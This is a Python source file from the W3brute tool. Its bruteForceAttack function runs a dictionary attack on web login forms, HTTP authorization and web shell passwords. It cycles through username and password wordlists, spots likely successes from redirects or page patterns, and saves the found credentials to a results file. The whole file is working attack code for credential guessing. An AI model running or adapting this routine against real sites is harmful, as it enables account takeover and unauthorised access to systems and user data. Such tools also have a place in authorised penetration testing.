#!/usr/bin/env python

# Copyright (c) 2018 W3brute Developers.
# See LICENSE for more details.

import re

from lib.core.common import clearLine
from lib.core.common import cetakData
from lib.core.common import createFileObject
from lib.core.common import checkRegexValid
from lib.core.common import checkStatus
from lib.core.common import installBuiltin
from lib.core.common import uninstallBuiltin
from lib.core.common import getCredentialType
from lib.core.common import getRequestData
from lib.core.common import pindahBaris
from lib.core.data import auth
from lib.core.data import credDb
from lib.core.data import html
from lib.core.data import konf
from lib.core.data import status
from lib.core.data import target
from lib.core.exception import W3bruteNextStepException
from lib.core.exception import W3bruteRedirectException
from lib.core.exception import W3bruteSkipTargetException
from lib.core.exception import W3bruteStopBruteForceException
from lib.core.exception import W3bruteQuitException
from lib.request.connect import UserAgent
from lib.utils.output import OutputWriter
from lib.utils.text import Progress
from lib.utils.text import Spinner

def bruteForceAttack():
    infoMsg = "starting attacks..."
    logger.info(infoMsg)
    regexp = re.compile(target.PAGE, re.I)
    
    if not auth.IS_AUTHORIZATION:
        form = html.form
        field = html.field
    
    target.kredensial = list()
    
    try:
        # bilang ke interrupt handler
        # jika w3brute sedang menjalankan sesi bruteforce
        konf.bruteSession = True
        
        if not auth.IS_WEBSHELL_AUTH:
            # mendapatkan daftar username sesuai tipe autentikasi.
            credType = "standard" if not auth.IS_EMAIL_AUTH else "email"
            usernames = sorted(credDb[credType].usernames)
            passwords = sorted(credDb.passwords)
            
            pbar = Progress("[INFO] testing account -> ")
            installBuiltin("pbar", pbar)
            
            for username in usernames:
                username = username.strip()
                
                for password in passwords:
                    password = password.strip()
                    
                    msg = "{0} : {1}".format(username, password)
                    pbar.write(msg)
                    
                    authcred = None
                    
                    if auth.IS_AUTHORIZATION:
                        authcred = (username, password)
                        url = target.URL
                    else:
                        form[field.username] = username
                        form[field.password] = password
                        
                        url = getRequestData(form)
                    
                    response = UserAgent.open(url, authCred=authcred)
                    
                    # mendapatkan informasi jika akun 'berpotensi'
                    # dari respon url setelah melakukan POST DATA
                    try:
                        newUrl = response.geturl()
                        if not regexp.search(newUrl):
                            status.found = True
                    
                    except AttributeError:
                        pass
                    
                    checkRegexValid(response) 
                    checkStatus(username, password)
                    pindahBaris()
        
        else:
            pbar = Progress("[INFO] testing password -> ")
            installBuiltin("pbar", pbar)
            
            wordlist = sorted(credDb.wordlist)
            for password in wordlist:
                password = password.strip()
                
                pbar.write(password)
                form[field.password] = password
                url = getRequestData(form)
                
                try:
                    # mendapatkan informasi jika password (berpotensi)
                    # dari respon kode HTTP
                    response = UserAgent.open(url, allow_redirects=False)
                except W3bruteRedirectException:
                    status.found = True
                
                checkRegexValid(response) 
                checkStatus(password)
                pindahBaris() 
    
    except W3bruteStopBruteForceException:
        pass
    
    # bilang ke interrupt handler
    # kalau sesi bruteforce sudah selesai.
    del konf.bruteSession
    
    pbar.finish()
    
    # cek jika sudah dapat akun berpotensi
    if len(target.kredensial) > 0:
        infoMsg = "w3brute managed to get %d potential %s" + ("s" if len(target.kredensial) > 1 else "")
        infoMsg %= (len(target.kredensial), getCredentialType())
        logger.info(infoMsg)
        
        fp = createFileObject()
        fieldnames = ["username", "password"] if not auth.IS_WEBSHELL_AUTH else ["password"]
        fieldnames.insert(0, "#")
        fieldnames.append("status")
        
        output = OutputWriter(fp, fieldnames, konf.fileFormat)
        
        maxval = len(target.kredensial)
        spin = Spinner("[INFO] saving results... ", maxval=maxval)
        
        try:
            for (num, kred) in enumerate(target.kredensial):
                num += 1
                kred = (num,) + kred
                output.add_row(*kred)
                spin.show_progress()
        
        except W3bruteNextStepException:
            pass
        
        output.close()
        spin.done()
        
        infoMsg = "results of the w3brute are stored in %s" % repr(fp.name)
        logger.info(infoMsg)
        
        konf.selesai = True
    
    else:
        clearLine()
        
        warnMsg = "[WARNING] w3brute has not managed to find a potential '%s'. " % getCredentialType()
        warnMsg += "please try again later.\n"
        cetakData(warnMsg)
    
    uninstallBuiltin("pbar")
    
    if isinstance(konf.quit, bool):
        raise W3bruteQuitException
    
    raise W3bruteSkipTargetException
